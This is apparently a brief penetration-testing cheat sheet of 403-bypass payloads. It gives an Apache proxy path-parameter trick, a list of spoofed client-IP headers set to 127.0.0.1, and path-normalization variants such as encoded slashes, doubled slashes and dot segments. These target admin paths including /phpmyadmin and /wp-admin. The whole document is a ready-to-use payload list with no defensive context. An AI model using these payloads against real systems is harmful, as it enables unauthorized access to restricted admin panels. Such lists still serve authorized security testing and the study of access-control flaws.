
### APACHE PROXY 403 BYPASS
```shell
/admin;foo=bar/dashboard
```

### HEADERS
```shell
- X-ProxyUser-Ip: 127.0.0.1
- Client-IP: 127.0.0.1
- Host: localhost
- X-Originating-IP: 127.0.0.1
- X-Forwarded-For: 127.0.0.1
- X-Remote-IP: 127.0.0.1
- X-Remote-Addr: 127.0.0.1
- X-Real-IP: 127.0.0.1
```

### PATH
```shell
- test.com/admin/*
- test.com/*admin/
- test.com/%2fadmin/
- test.com%2fadmin%2f
- test.com/./admin/
- test.com//admin/./
- test.com///admin///
- test.com//admin//
- test.com/ADMIN/
- test.com/;/admin/
- test.com//;//admin/
```

*EXAMPLE*
```shell
- /phpmyadmin/*
- /./phpmyadmin/
- //phpmyadmin//
- /*/phpmyadmin/
- ///phpmyadmin///
- //wp-admin//
```

